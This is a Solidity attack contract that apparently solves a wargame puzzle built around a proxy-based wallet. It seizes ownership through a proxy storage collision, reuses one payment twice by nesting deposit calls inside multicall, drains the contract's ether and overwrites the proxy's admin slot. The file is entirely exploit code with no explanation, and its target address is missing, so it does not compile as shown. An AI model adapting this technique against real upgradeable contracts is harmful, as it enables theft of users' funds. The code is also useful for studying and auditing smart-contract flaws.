// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWallet {

    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Attack {

    IWallet wallet = IWallet();


    function attack() public payable{

        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
    
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);

        wallet.multicall{value: msg.value}(data);
        wallet.execute(msg.sender, 0.002 ether, "");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));

    }
}